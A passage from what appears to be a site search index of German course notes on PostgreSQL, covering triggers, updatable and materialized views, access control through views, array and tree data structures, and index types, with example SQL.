\ndelete_tbl_trigger\n\n\nBEFORE\n \nDELETE\n\n\nON\n \ntbl\n\n\nFOR\n \nEACH\n \nROW\n\n\nEXECUTE\n \nPROCEDURE\n \ndelete_tbl_trigger_fn\n();\n\n\n\n\n\n\nAbgeleitete Attribute\n\n\nCREATE\n \nOR\n \nREPLACE\n \nfunction\n \nincrement_salaer\n\n\n(\n \nv_salaer\n \nIN\n \nFirma\n.\nSalaerSumme\n%\nTYPE\n)\n\n\nRETURNS\n \nnull\n\n\nAS\n \n$$\n\n\nBEGIN\n\n    \nUPDATE\n \nFirma\n\n    \nSET\n \nSalaerSumme\n \n=\n \ncoalesce\n \n(\nSalaerSumme\n \n,\n0\n)\n \n+\n \nv_salaer\n;\n\n\nEND\n \n;\n\n\n$$\n \nlanguage\n \nplpgsql\n;\n\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \nberechne_SalSumme_trigger_fn\n()\n\n\nRETURNS\n \ntrigger\n \nAS\n \n$$\n\n\nBEGIN\n\n    \nIF\n \nTG_OP\n=\nDELETE\n \nTHEN\n \nPERFORM\n \nincrement_salaer\n(\n \n-\n1\n \n*\n \nOLD\n.\nsalaer\n);\n\n    \nELSIF\n \nTG_OP\n=\nUPDATE\n \nTHEN\n\n        \nPERFORM\n \nincrement_salaer\n(\nNEW\n.\nSalaer\n-\nOLD\n.\nSalaer\n);\n\n    \nELSE\n \n/*inserting*/\n \nPERFORM\n \nincrement_salaer\n(\nNEW\n.\nsalaer\n);\n\n    \nEND\n \nIF\n;\n\n    \nRETURN\n \nnull\n;\n\n\nEND\n;\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\nCREATE\n \nTRIGGER\n \nberechne_Salaersumme\n\n\nAFTER\n \nINSERT\n \nOR\n \nUPDATE\n \nOF\n \nSalaer\n \nOR\n \nDELETE\n \nON\n \nAngestellter\n\n\nFOR\n \nEACH\n \nROW\n\n\nEXECUTE\n \nPROCEDURE\n \nberechne_SalSumme_trigger_fn\n();\n\n\n\n\n\n\nAuditing\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \nprocess_ang_audit\n()\n \nRETURNS\n\n\nTRIGGER\n \nAS\n \n$$\n\n\nBEGIN\n\n    \nIF\n \n(\nTG_OP\n \n=\n \nDELETE\n)\n \nTHEN\n\n        \nINSERT\n \nINTO\n \nang_audit\n\n            \nSELECT\n \nD\n,\n \nnow\n(),\n \nuser\n,\n \nOLD\n.\nname\n,\n \nOLD\n.\nsalaer\n;\n\n        \nRETURN\n \nOLD\n;\n\n    \nELSIF\n \n(\nTG_OP\n \n=\n \nUPDATE\n)\n \nTHEN\n\n        \nINSERT\n \nINTO\n \nang_audit\n\n            \nSELECT\n \nU\n,\n \nnow\n(),\n \nuser\n,\n \nNEW\n.\nname\n,\n \nNEW\n.\nsalaer\n;\n\n    \nELSIF\n \n(\nTG_OP\n \n=\n \nINSERT\n)\n \nTHEN\n\n        \nINSERT\n \nINTO\n \nang_audit\n\n            \nSELECT\n \nI\n,\n \nnow\n(),\n \nuser\n,\n \nNEW\n.\nname\n,\n \nNEW\n.\nsalaer\n;\n\n    \nEND\n \nIF\n;\n\n    \nRETURN\n \nNULL\n;\n\n    \n-- result is ignored since this is an AFTER trigger\n\n\nEND\n;\n\n\n$$\n \nlanguage\n \nplpgsql\n;", 
            "title": "4 Triggers"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#triggers", 
            "text": "", 
            "title": "Triggers"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#anwedungen", 
            "text": "Berechnen von komplexen Konsistenzbedingungen  Sicherheiten, z.B. das \u00c4nderungen an Tabelle X nur an Wochentagen ausgef\u00fchrt werden k\u00f6nnen  Sammeln von Statistik und Log-Daten  Berechnen von abgeleiteten Attributen", 
            "title": "Anwedungen"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#eigenschaften", 
            "text": "Sind DB-Objekte und immer einer Tabelle zugeordnet  Werden in Stored Procedures programmiert  Sind parameterlos  Werden beim Eintreten eines Events vom DBMS ausgef\u00fchrt, nicht manuell", 
            "title": "Eigenschaften"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#ausfuhrung", 
            "text": "\"Before\" Triggers k\u00f6nnen \u00c4nderungen an einer Row vornehmen  \"After\" Triggers k\u00f6nnen nur reagieren, der Returnwert wird ignoriert  Triggers werden in alphabetischer Reihenfolge ausgef\u00fchrt  Wenn \"Before\"-Trigger als R\u00fcckgabewert NULL liefert, wird die Operation abgebrochen!", 
            "title": "Ausf\u00fchrung"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#syntax", 
            "text": "Allgemein (Beispiel)   CREATE   |   ALTER   TRIGGER   name   BEFORE   |   AFTER   INSERT   [ OR   UPDATE   [ OF   attribute ]   [ OR   ...]]  ON   table  FOR   EACH   ROW   |   STATEMENT  EXECUTE   PROCEDURE   mytriggerfunc ();    Trigger-Funktion (Procedure)   CREATE   FUNCTION   mytrigger_func ()  RETURNS   TRIGGER   -- special meaning  AS   $$  body  $$   language   plpgsql ;    Die Eigenschaften eines Triggers, z.B. ob  BEFORE  oder  AFTER , auf welche Operation getriggert wird, Name der Tabelle, etc. wird in Variablen der Funktion \u00fcbergeben, alle mit dem Prefix  TG_  Mit der Variable  NEW  kann eine neue, leere Row gef\u00fcllt werden (nur bei INSERT UND UPDATE)  Mit der  OLD -Variable wird die \"alte\" Row angesprochen (nur bei UPDATE und DELETE)", 
            "title": "Syntax"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#beispiele", 
            "text": "CREATE   OR   REPLACE   FUNCTION   dt_trigger_func ()  RETURNS   TRIGGER   AS   $$  BEGIN \n     IF   ( TG_OP   =   INSERT )   THEN \n         NEW . creation_date   : =   now (); \n     ELSIF   ( TG_OP   =   UPDATE )   THEN \n         NEW . modification_date   : =   now (); \n     END   IF ; \n     RETURN   NEW ;  END  $$   LANGUAGE   plpgsql ;", 
            "title": "Beispiele"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#before-delete", 
            "text": "CREATE   OR   REPLACE   FUNCTION   delete_tbl_trigger_fn ()  RETURNS   trigger   AS   $$  BEGIN \n     UPDATE   tbl   SET   deleted = true   WHERE   id = OLD . id ; \n     RETURN   NULL ;   -- Note RETURN NULL, not RETURN OLD!  END ;  $$   LANGUAGE   plpgsql ;  CREATE   TRIGGER   delete_tbl_trigger  BEFORE   DELETE  ON   tbl  FOR   EACH   ROW  EXECUTE   PROCEDURE   delete_tbl_trigger_fn ();", 
            "title": "Before Delete"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#abgeleitete-attribute", 
            "text": "CREATE   OR   REPLACE   function   increment_salaer  (   v_salaer   IN   Firma . SalaerSumme % TYPE )  RETURNS   null  AS   $$  BEGIN \n     UPDATE   Firma \n     SET   SalaerSumme   =   coalesce   ( SalaerSumme   , 0 )   +   v_salaer ;  END   ;  $$   language   plpgsql ;  CREATE   OR   REPLACE   FUNCTION   berechne_SalSumme_trigger_fn ()  RETURNS   trigger   AS   $$  BEGIN \n     IF   TG_OP = DELETE   THEN   PERFORM   increment_salaer (   - 1   *   OLD . salaer ); \n     ELSIF   TG_OP = UPDATE   THEN \n         PERFORM   increment_salaer ( NEW . Salaer - OLD . Salaer ); \n     ELSE   /*inserting*/   PERFORM   increment_salaer ( NEW . salaer ); \n     END   IF ; \n     RETURN   null ;  END ;  $$   LANGUAGE   plpgsql ;  CREATE   TRIGGER   berechne_Salaersumme  AFTER   INSERT   OR   UPDATE   OF   Salaer   OR   DELETE   ON   Angestellter  FOR   EACH   ROW  EXECUTE   PROCEDURE   berechne_SalSumme_trigger_fn ();", 
            "title": "Abgeleitete Attribute"
        }, 
        {
            "location": "/Dbs2/4_Triggers/#auditing", 
            "text": "CREATE   OR   REPLACE   FUNCTION   process_ang_audit ()   RETURNS  TRIGGER   AS   $$  BEGIN \n     IF   ( TG_OP   =   DELETE )   THEN \n         INSERT   INTO   ang_audit \n             SELECT   D ,   now (),   user ,   OLD . name ,   OLD . salaer ; \n         RETURN   OLD ; \n     ELSIF   ( TG_OP   =   UPDATE )   THEN \n         INSERT   INTO   ang_audit \n             SELECT   U ,   now (),   user ,   NEW . name ,   NEW . salaer ; \n     ELSIF   ( TG_OP   =   INSERT )   THEN \n         INSERT   INTO   ang_audit \n             SELECT   I ,   now (),   user ,   NEW . name ,   NEW . salaer ; \n     END   IF ; \n     RETURN   NULL ; \n     -- result is ignored since this is an AFTER trigger  END ;  $$   language   plpgsql ;", 
            "title": "Auditing"
        }, 
        {
            "location": "/Dbs2/5_Views/", 
            "text": "Updatable / Materialized Views\n\n\nViews\n\n\n\n\nExterne Sichten f\u00fcr Applikationen\n\n\nVerringern die Komplexit\u00e4t von Queries\n\n\nSind \"updatable\", wenn gewisse Einschr\u00e4nkungen erf\u00fcllt sind\n\n\nEinen Eintrag in der FROM Klausel\n\n\nKeine WITH, GROUP BY, LIMIT, OFFSET, etc\n\n\nkeine UNION, INTERSECT, EXCEPT\n\n\nKeine Aggregation oder Window-Funktion\n\n\n\n\n\n\nEs m\u00fcssen nicht alle Felder updatable sein, die View kann dann immer noch mit UPDATE bearbeitt werden, aber logischwerweise nicht die \"nicht-updatable\" Felder\n\n\n\n\nBeispiel Updatable\n\n\ncreate\n \nview\n \nourview1\n \nas\n\n    \nselect\n \nname\n,\n \nabtnr\n,\n \nsalaer\n\n    \nfrom\n \nangestellter\n\n    \norder\n \nby\n \nabtnr\n,\n \nsalaer\n \ndesc\n;\n\n\n\nupdate\n \nourview1\n \nset\n \nsalaer\n=\nsalaer\n+\n10\n;\n\n\n\n\n\n\nBeispiel NICHT updatable\n\n\ncreate\n \nview\n \nourview2\n \nas\n\n    \nselect\n \nabtnr\n,\n \navg\n(\nsalaer\n)\n \nas\n \nsalaer\n\n    \nfrom\n \nangestellter\n\n    \ngroup\n \nby\n \nabtnr\n;\n\n\nupdate\n \nourview2\n \nset\n \nsalaer\n=\nsalaer\n+\n10\n;\n\n\n-- Fehler, view enth\u00e4lt groupby\n\n\n\n\n\n\nInstead-of-Triggers\n\n\n\n\nWerden anstelle der urspr\u00fcnglichen SQL-Operation ausgef\u00fchrt\n\n\nK\u00f6nnen f\u00fcr Modifikationen auf Tables und Views ausgef\u00fchrt werden\n\n\nLeiten insert, update, delete auf Views auf die darunterliegenden Tabellen weiter\n\n\n\n\nBeispiel\n\n\nCREATE\n \nOR\n \nREPLACE\n \nVIEW\n \nabtleiterinfo\n \n(\nabtnr\n,\n \nabtname\n,\n \nabtchef\n)\n\n\nAS\n\n    \nSELECT\n \nabt\n.\nabtnr\n,\n \nabt\n.\nname\n,\n \nal\n.\nabtchef\n\n    \nFROM\n \nabteilung\n \nabt\n\n    \nINNER\n \nJOIN\n \nabtleitung\n \nal\n\n        \nON\n \nabt\n.\nabtnr\n=\nal\n.\nabtnr\n\n    \nINNER\n \nJOIN\n \nangestellter\n \nang\n\n        \nON\n \nang\n.\npersnr\n=\nal\n.\nabtchef\n;\n\n\n\n\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \nabtleiterinfo_update_abtchef_fn\n()\n\n\nRETURNS\n \nTRIGGER\n \nAS\n \n$$\n\n\nBEGIN\n\n    \nIF\n \nTG_OP\n \n=\n \nUPDATE\n \nTHEN\n\n        \nUPDATE\n \nabtleitung\n \nSET\n \nabtchef\n=\nNEW\n.\nabtchef\n\n            \nWHERE\n \nabtnr\n=\nOLD\n.\nabtnr\n;\n\n        \nRETURN\n \nNEW\n;\n\n    \nEND\n \nIF\n;\n\n\nEND\n;\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\n\n\n\nCREATE\n \nTRIGGER\n \nabtleiterinfo_update_abtchef\n\n\nINSTEAD\n \nOF\n \nUPDATE\n \nON\n \nabtleiterinfo\n\n\nFOR\n \nEACH\n \nROW\n\n\nEXECUTE\n \nPROCEDURE\n \nabtleiterinfo_update_abtchef_fn\n();\n\n\n\n\n\n\nUPDATE\n \nabtleiterinfo\n \nSET\n \nabtchef\n=\n1019\n \nWHERE\n \nabtnr\n=\n2\n;\n\n\n\n\n\n\nMaterialized View\n\n\n\n\nEine normale View wird bei jedem Aufruf (Query) neu berechnet\n\n\nEine \nMaterialized View\n wird gecached und nur periodisch neu berechnet\n\n\n\n\nCREATE\n \nMATERIALIZED\n \nVIEW\n \nview_name\n\n\nAS\n\n\nquery\n\n\nWITH\n \n[\nNO\n]\n \nDATA\n;\n\n\n\n\n\n\n\n\nMit \nNO DATA\n wird die View initial nicht geladen und kann erst gelesen werden, wenn sie das erste Mal refreshed wird\n\n\nView neu laden:\n\n\n\n\nREFRESH\n \nMATERIALIZED\n \nVIEW\n \nview_name\n;\n\n\n\n\n\n\nZugriffsschutz mit Views\n\n\n\n\nAuf Views k\u00f6nnen eigene Berechtigungen vergeben werden\n\n\nSomit kann z.B. einem user Zugriff auf eine unterliegende Tabelle verwehrt bleiben, er kann aber \u00fcber eine View bestimmte Attribute der Tabelle sehen\n\n\n\n\nCREATE\n \nVIEW\n \nAngPublic\n \n(\nPersnr\n,\n \nName\n,\n \nTel\n,\n \nWohnort\n)\n\n\nAS\n\n\nSELECT\n \nPersnr\n,\n \nName\n,\n \nTel\n,\n \nWohnort\n\n\nFROM\n \nAngestellter\n;\n\n\nGRANT\n \nSELECT\n \nON\n \nAngPublic\n \nTO\n \nPUBLIC\n;\n\n\n\n\n\n\n\n\nIn der View kann z.B. \nuser\n verwendet werden, um Daten spezifisch f\u00fcr den angemeldeten Db-User anzuzeigen\n\n\n\n\nCREATE\n \nOR\n \nREPLACE\n \nVIEW\n \nAngestellter_V\n \nAS\n\n\nSELECT\n \na\n.\n*\n\n\nFROM\n \nAngestellter\n \na\n\n\nWHERE\n \na\n.\nlogin\n \n=\n \nuser\n\n\n\n\n\n\n\n\nZugrifsschutz einer Tabelle kann auch \u00fcber Stored Procedure realisiert werden. Dazu wird vom Table-Owner eine Stored Procedure erstellt, die eine Tabelle ver\u00e4ndert, und anschliessend Ausf\u00fchrungsrechte an andere User erteilt. Die Stored Procedure werden immer mit den Rechten des Erstellers ausgef\u00fchrt\n\n\n\n\nGRANT\n \nEXEC\n \nON\n \nSalaerErhoehung\n \nTO\n \nPersonalChef_R\n;\n\n\n\n\n\n\nTempor\u00e4re Tabellen\n\n\n\n\nErstellt eine Tabelle, die am Ende der Session oder der Transaktion gel\u00f6scht wird\n\n\n\n\nCREATE\n \nTEMPORARY\n \nTABLE\n \ntmp\n \nAS\n\n    \nSELECT\n \ngenerate_series\n(\n1\n,\n100000\n)\n \nAS\n \na\n;", 
            "title": "5 Views"
        }, 
        {
            "location": "/Dbs2/5_Views/#updatable-materialized-views", 
            "text": "", 
            "title": "Updatable / Materialized Views"
        }, 
        {
            "location": "/Dbs2/5_Views/#views", 
            "text": "Externe Sichten f\u00fcr Applikationen  Verringern die Komplexit\u00e4t von Queries  Sind \"updatable\", wenn gewisse Einschr\u00e4nkungen erf\u00fcllt sind  Einen Eintrag in der FROM Klausel  Keine WITH, GROUP BY, LIMIT, OFFSET, etc  keine UNION, INTERSECT, EXCEPT  Keine Aggregation oder Window-Funktion    Es m\u00fcssen nicht alle Felder updatable sein, die View kann dann immer noch mit UPDATE bearbeitt werden, aber logischwerweise nicht die \"nicht-updatable\" Felder", 
            "title": "Views"
        }, 
        {
            "location": "/Dbs2/5_Views/#beispiel-updatable", 
            "text": "create   view   ourview1   as \n     select   name ,   abtnr ,   salaer \n     from   angestellter \n     order   by   abtnr ,   salaer   desc ;  update   ourview1   set   salaer = salaer + 10 ;", 
            "title": "Beispiel Updatable"
        }, 
        {
            "location": "/Dbs2/5_Views/#beispiel-nicht-updatable", 
            "text": "create   view   ourview2   as \n     select   abtnr ,   avg ( salaer )   as   salaer \n     from   angestellter \n     group   by   abtnr ;  update   ourview2   set   salaer = salaer + 10 ;  -- Fehler, view enth\u00e4lt groupby", 
            "title": "Beispiel NICHT updatable"
        }, 
        {
            "location": "/Dbs2/5_Views/#instead-of-triggers", 
            "text": "Werden anstelle der urspr\u00fcnglichen SQL-Operation ausgef\u00fchrt  K\u00f6nnen f\u00fcr Modifikationen auf Tables und Views ausgef\u00fchrt werden  Leiten insert, update, delete auf Views auf die darunterliegenden Tabellen weiter", 
            "title": "Instead-of-Triggers"
        }, 
        {
            "location": "/Dbs2/5_Views/#beispiel", 
            "text": "CREATE   OR   REPLACE   VIEW   abtleiterinfo   ( abtnr ,   abtname ,   abtchef )  AS \n     SELECT   abt . abtnr ,   abt . name ,   al . abtchef \n     FROM   abteilung   abt \n     INNER   JOIN   abtleitung   al \n         ON   abt . abtnr = al . abtnr \n     INNER   JOIN   angestellter   ang \n         ON   ang . persnr = al . abtchef ;   CREATE   OR   REPLACE   FUNCTION   abtleiterinfo_update_abtchef_fn ()  RETURNS   TRIGGER   AS   $$  BEGIN \n     IF   TG_OP   =   UPDATE   THEN \n         UPDATE   abtleitung   SET   abtchef = NEW . abtchef \n             WHERE   abtnr = OLD . abtnr ; \n         RETURN   NEW ; \n     END   IF ;  END ;  $$   LANGUAGE   plpgsql ;   CREATE   TRIGGER   abtleiterinfo_update_abtchef  INSTEAD   OF   UPDATE   ON   abtleiterinfo  FOR   EACH   ROW  EXECUTE   PROCEDURE   abtleiterinfo_update_abtchef_fn ();   UPDATE   abtleiterinfo   SET   abtchef = 1019   WHERE   abtnr = 2 ;", 
            "title": "Beispiel"
        }, 
        {
            "location": "/Dbs2/5_Views/#materialized-view", 
            "text": "Eine normale View wird bei jedem Aufruf (Query) neu berechnet  Eine  Materialized View  wird gecached und nur periodisch neu berechnet   CREATE   MATERIALIZED   VIEW   view_name  AS  query  WITH   [ NO ]   DATA ;    Mit  NO DATA  wird die View initial nicht geladen und kann erst gelesen werden, wenn sie das erste Mal refreshed wird  View neu laden:   REFRESH   MATERIALIZED   VIEW   view_name ;", 
            "title": "Materialized View"
        }, 
        {
            "location": "/Dbs2/5_Views/#zugriffsschutz-mit-views", 
            "text": "Auf Views k\u00f6nnen eigene Berechtigungen vergeben werden  Somit kann z.B. einem user Zugriff auf eine unterliegende Tabelle verwehrt bleiben, er kann aber \u00fcber eine View bestimmte Attribute der Tabelle sehen   CREATE   VIEW   AngPublic   ( Persnr ,   Name ,   Tel ,   Wohnort )  AS  SELECT   Persnr ,   Name ,   Tel ,   Wohnort  FROM   Angestellter ;  GRANT   SELECT   ON   AngPublic   TO   PUBLIC ;    In der View kann z.B.  user  verwendet werden, um Daten spezifisch f\u00fcr den angemeldeten Db-User anzuzeigen   CREATE   OR   REPLACE   VIEW   Angestellter_V   AS  SELECT   a . *  FROM   Angestellter   a  WHERE   a . login   =   user    Zugrifsschutz einer Tabelle kann auch \u00fcber Stored Procedure realisiert werden. Dazu wird vom Table-Owner eine Stored Procedure erstellt, die eine Tabelle ver\u00e4ndert, und anschliessend Ausf\u00fchrungsrechte an andere User erteilt. Die Stored Procedure werden immer mit den Rechten des Erstellers ausgef\u00fchrt   GRANT   EXEC   ON   SalaerErhoehung   TO   PersonalChef_R ;", 
            "title": "Zugriffsschutz mit Views"
        }, 
        {
            "location": "/Dbs2/5_Views/#temporare-tabellen", 
            "text": "Erstellt eine Tabelle, die am Ende der Session oder der Transaktion gel\u00f6scht wird   CREATE   TEMPORARY   TABLE   tmp   AS \n     SELECT   generate_series ( 1 , 100000 )   AS   a ;", 
            "title": "Tempor\u00e4re Tabellen"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/", 
            "text": "Datenstrukturen\n\n\nArrays\n\n\n\n\nIn Postgres 1-indexiert!\n\n\nDoku: \nhttps://www.postgresql.org/docs/current/static/arrays.html\n\n\n\n\nCREATE\n \nTABLE\n \nsal_emp\n \n(\n\n    \nname\n \ntext\n,\n\n    \npay_by_quarter\n \ninteger\n[],\n\n    \nschedule\n \ntext\n[][]\n\n\n);\n\n\n\n\n\n\nINSERT\n \nINTO\n \nsal_emp\n \nVALUES\n \n(\n\n\nBill\n,\n\n\nARRAY\n[\n10000\n,\n \n10000\n,\n \n10000\n,\n \n10000\n],\n\n\nARRAY\n[[\nmeeting\n,\n \nlunch\n],\n \n[\ntraining\n,\n \npresentation\n]]\n\n\n);\n\n\n\n\n\n\nAccessoren\n\n\nSELECT\n \nARRAY\n[\n1\n,\n2\n,\n3\n+\n4\n];\n\n\n-- returns: {1,2,7}\n\n\n\n\n\n\nSlicing\n\n\nSELECT\n \nschedule\n[\n1\n:\n2\n]\n\n\n-- first two elements\n\n\n\n\n\n\n\n\narray[from:to]\n\n\nfrom\n und \nto\n sind inclusive!\n\n\n\n\nOperatoren\n\n\n\n\nEquality mit \n=\n\n\n\"Is contained by\" mit \n@\n\n\n\n\nARRAY\n[\n2\n,\n7\n]\n \n@\n \nARRAY\n[\n1\n,\n7\n,\n4\n,\n2\n,\n6\n];\n\n\n\n\n\n\n\n\nOverlap: \n\n\n\n\nSELECT\n \nARRAY\n[\n1\n,\n4\n,\n3\n]\n \n \nARRAY\n[\n2\n,\n1\n]\n\n\n\n\n\n\nDictionaries\n\n\n\n\nCollection aus Key-Value-Pairs, auch \"Entitiy Attribute Value\" - EAV\n\n\nNur in ausnamef\u00e4llen in RDBS verwenden!\n\n\n\n\n\n\nNote\n\n\nTODO!\n\n\n\n\nTrees\n\n\n\n\nAdjazenzliste: Jeder Record hat einen Fremdschl\u00fcssel zu seinem Parent\n\n\nNested Set-Modell: Die Knoten werden in Preorder-Reihenfolge durchnummeriert. Beim traversieren in die tiefe wird \"left\" gesetzt, beim backtracking wird \"right\" gesetzt (immer aufsteigend gez\u00e4hlt)\n\n\n\n\nMaterialized Path (ltree)\n\n\n\n\nDoku: \nhttps://www.postgresql.org/docs/current/static/ltree.html\n\n\nKnoten auf einer Ebene werden von links nach rechts mit 1,2,3,... nummeriert\n\n\nJeder Knoten hat einen Pfad zu sich von der Root aus gespeichert, in der Form \n1.2.1.\n...\n (\"lineage\")\n\n\nIm Postgres-Datentyp \nltree\n k\u00f6nnen die Knoten beschriftet werden\n\n\nDann ist ein Pfad z.B. \ntop.countries.europe.switzerland", 
            "title": "6 Datenstrukturen"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#datenstrukturen", 
            "text": "", 
            "title": "Datenstrukturen"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#arrays", 
            "text": "In Postgres 1-indexiert!  Doku:  https://www.postgresql.org/docs/current/static/arrays.html   CREATE   TABLE   sal_emp   ( \n     name   text , \n     pay_by_quarter   integer [], \n     schedule   text [][]  );   INSERT   INTO   sal_emp   VALUES   (  Bill ,  ARRAY [ 10000 ,   10000 ,   10000 ,   10000 ],  ARRAY [[ meeting ,   lunch ],   [ training ,   presentation ]]  );", 
            "title": "Arrays"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#accessoren", 
            "text": "SELECT   ARRAY [ 1 , 2 , 3 + 4 ];  -- returns: {1,2,7}", 
            "title": "Accessoren"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#slicing", 
            "text": "SELECT   schedule [ 1 : 2 ]  -- first two elements    array[from:to]  from  und  to  sind inclusive!", 
            "title": "Slicing"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#operatoren", 
            "text": "Equality mit  =  \"Is contained by\" mit  @   ARRAY [ 2 , 7 ]   @   ARRAY [ 1 , 7 , 4 , 2 , 6 ];    Overlap:    SELECT   ARRAY [ 1 , 4 , 3 ]     ARRAY [ 2 , 1 ]", 
            "title": "Operatoren"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#dictionaries", 
            "text": "Collection aus Key-Value-Pairs, auch \"Entitiy Attribute Value\" - EAV  Nur in ausnamef\u00e4llen in RDBS verwenden!    Note  TODO!", 
            "title": "Dictionaries"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#trees", 
            "text": "Adjazenzliste: Jeder Record hat einen Fremdschl\u00fcssel zu seinem Parent  Nested Set-Modell: Die Knoten werden in Preorder-Reihenfolge durchnummeriert. Beim traversieren in die tiefe wird \"left\" gesetzt, beim backtracking wird \"right\" gesetzt (immer aufsteigend gez\u00e4hlt)", 
            "title": "Trees"
        }, 
        {
            "location": "/Dbs2/6_Datenstrukturen/#materialized-path-ltree", 
            "text": "Doku:  https://www.postgresql.org/docs/current/static/ltree.html  Knoten auf einer Ebene werden von links nach rechts mit 1,2,3,... nummeriert  Jeder Knoten hat einen Pfad zu sich von der Root aus gespeichert, in der Form  1.2.1. ...  (\"lineage\")  Im Postgres-Datentyp  ltree  k\u00f6nnen die Knoten beschriftet werden  Dann ist ein Pfad z.B.  top.countries.europe.switzerland", 
            "title": "Materialized Path (ltree)"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/", 
            "text": "Interne Ebene\n\n\nHeap\n\n\n\n\nEine DB-Tabelle wird in einem Heap (Collection) von Data Pages gespeichert\n\n\nJede Data-Page hat eine fixe Gr\u00f6sse, meist 8KB\n\n\nDie Rows darin sind nicht sortiert\n\n\n\n\nTable Scan\n\n\n\n\nScanning aller Pages einer Tabelle durch alle Rows\n\n\nExtrahiere Rows, die Query-Bedinung erf\u00fcllen\n\n\nMeist langsame Operation, soll durch Indexe verbessert werden\n\n\nWenn aber Resultatset 80% der Tabelle enth\u00e4lt, ist der Table Scan schneller als der Zugriff \u00fcber ein Index\n\n\n\n\nIndexe\n\n\n\n\nDienen der Beschleunigung der Suche\n\n\nBraucht zus\u00e4tzlich Speicher-Overhead\n\n\n\n\nB-Trees\n\n\n\n\n\"Balanced Trees\"\n\n\nEignet sich f\u00fcr Equality-Search (Filtern nach Gleichheitsbedigung) und Range-Search (Suchen in Wertebereich)\n\n\n\"B+-Baum\" hat Daten nur in Bl\u00e4ttern\n\n\nDurch ausbalancierter Baum \nO(log(n))\n Zugriffe\n\n\nEin Knoten hat die Gr\u00f6sse einer Page\n\n\nVisualisierung: \nhttps://www.cs.usfca.edu/~galles/visualization/BTree.html\n\n\nIn einem \nclustered Index\n enthalten die Bl\u00e4tter selbst die Daten-Rows\n\n\nIn einem \nunclustered Index\n halten die Bl\u00e4tter nur Referenzen auf die Rows im Heap\n\n\n\n\nHash-Index\n\n\n\n\nSpeichert Key-Value-pairs aufgrund einer Hash-funkion (wie hashmap)\n\n\nPerformance-Einbussen bei gleichen Hashes (gibt \"overflow chain\" - linked-List der Rows mit den gleichen hashes)\n\n\n\n\nBitmap Index\n\n\n\n\nSpeichert Attribute als Bitmuster\n\n\nNur geeignet, wenn Werte in Attribute kleinen Wertebereich haben (und diskret sind)\n\n\nWenn z.B. in einem Attribut immer nur die gleichen 2 Werte vorkommen, kann dies mit 1 Bit indexiert werden\n\n\nSchnelle Abfragen mit ORs / ANDs\n\n\n\n\nIndexe erstellen\n\n\n\n\nconvention (nicht standardisiert):\n\n\n\n\nCREATE\n \nINDEX\n \nIndexName\n\n\nON\n \nTable\n(\nattr\n)\n;\n\n\n\n\n\n\n\n\nAuf PK-Attributen werden automatisch Indices erstellt\n\n\n\n\n\n\nNote\n\n\nTODO\n\n\n\n\nQuery Processing\n\n\n\n\nEine Query wird geparst in einen Query-Tree\n\n\nVom Optimizer wird optimierter Ausf\u00fchrungsplan erstellt\n\n\nPoint Query\n: Suche Row mit bestimmten Wert, z.B. \nwhere id = 1024\n\n\nMultipoint Query\n: Suche mehrere Rows mit bestimmten Wert, z.B. \nwhere balance = 1000\n\n\nRange Query\n: Suche in einer Range, z.B. \nwhere income between 100 and 1000\n\n\nOrder Query\n: Query mit \norder by\n\n\nInterpretation Postgres\n\n\nIndex wird nicht immer verwendet, vor allem wenn alle Rows durchgegangen werden (z.B. \ncount(*)\n)\n\n\nEinfacher Select ist mit Index ca. 3-10x schneller", 
            "title": "8 Interne Ebene"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#interne-ebene", 
            "text": "", 
            "title": "Interne Ebene"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#heap", 
            "text": "Eine DB-Tabelle wird in einem Heap (Collection) von Data Pages gespeichert  Jede Data-Page hat eine fixe Gr\u00f6sse, meist 8KB  Die Rows darin sind nicht sortiert", 
            "title": "Heap"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#table-scan", 
            "text": "Scanning aller Pages einer Tabelle durch alle Rows  Extrahiere Rows, die Query-Bedinung erf\u00fcllen  Meist langsame Operation, soll durch Indexe verbessert werden  Wenn aber Resultatset 80% der Tabelle enth\u00e4lt, ist der Table Scan schneller als der Zugriff \u00fcber ein Index", 
            "title": "Table Scan"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#indexe", 
            "text": "Dienen der Beschleunigung der Suche  Braucht zus\u00e4tzlich Speicher-Overhead", 
            "title": "Indexe"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#b-trees", 
            "text": "\"Balanced Trees\"  Eignet sich f\u00fcr Equality-Search (Filtern nach Gleichheitsbedigung) und Range-Search (Suchen in Wertebereich)  \"B+-Baum\" hat Daten nur in Bl\u00e4ttern  Durch ausbalancierter Baum  O(log(n))  Zugriffe  Ein Knoten hat die Gr\u00f6sse einer Page  Visualisierung:  https://www.cs.usfca.edu/~galles/visualization/BTree.html  In einem  clustered Index  enthalten die Bl\u00e4tter selbst die Daten-Rows  In einem  unclustered Index  halten die Bl\u00e4tter nur Referenzen auf die Rows im Heap", 
            "title": "B-Trees"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#hash-index", 
            "text": "Speichert Key-Value-pairs aufgrund einer Hash-funkion (wie hashmap)  Performance-Einbussen bei gleichen Hashes (gibt \"overflow chain\" - linked-List der Rows mit den gleichen hashes)", 
            "title": "Hash-Index"
        }, 
        {
